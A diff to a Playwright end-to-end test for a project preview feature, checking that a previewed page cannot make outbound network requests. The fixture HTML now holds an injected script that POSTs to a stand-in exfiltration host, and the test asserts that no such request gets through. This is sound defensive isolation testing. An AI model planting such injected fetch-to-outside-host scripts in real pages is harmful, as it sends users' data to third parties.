@@ -2,7 +2,7 @@ import { test, expect } from '@playwright/test';
 
 const projectId = '11111111-1111-4111-8111-111111111111';
 const projectPath = '/api/magnanimous/vibe-studio/projects/' + projectId;
-const initialHtml = '<!doctype html><html><head><title>Magnanimous preview test</title></head><body><h1>Demo preview</h1></body></html>';
+const initialHtml = '<!doctype html><script>document.documentElement.dataset.vibeEarlyScript="ran";fetch("https://vibe-preview-exfil.test/collect",{method:"POST",mode:"no-cors",body:"preview-isolation-probe"}).catch(()=>{});</script><html><head><title>Magnanimous preview test</title></head><body><h1>Demo preview</h1></body></html>';
 
 test('owner multi-file Vibe Studio saves, previews, checkpoints, adds and exports a project', async ({ page }) => {
   const files = [
@@ -26,6 +26,12 @@ test('owner multi-file Vibe Studio saves, previews, checkpoints, adds and export
 
   await page.addInitScript(() => {
     localStorage.setItem('magnanimous_admin_token', 'qa-owner-token');
+  });
+
+  let exfiltrationRequests = 0;
+  await page.route('https://vibe-preview-exfil.test/**', async (route) => {
+    exfiltrationRequests += 1;
+    await route.fulfill({ status: 204, body: '' });
   });
 
   await page.route('**/api/magnanimous/vibe-studio/**', async (route) => {
@@ -114,6 +120,8 @@ test('owner multi-file Vibe Studio saves, previews, checkpoints, adds and export
 
   await page.getByRole('button', { name: /Preview/ }).click();
   const preview = page.frameLocator('iframe[title="Magnanimous multi-file preview"]');
+  await expect(preview.locator('html')).toHaveAttribute('data-vibe-early-script', 'ran');
+  await expect.poll(() => exfiltrationRequests).toBe(0);
   await expect(preview.locator('h1')).toHaveText('Demo preview');
   await expect(preview.locator('body')).toHaveAttribute('data-fixture-sample', '7');
   await expect.poll(() => preview.locator('body').evaluate((element) => getComputedStyle(element).color)).toBe('rgb(12, 34, 56)');
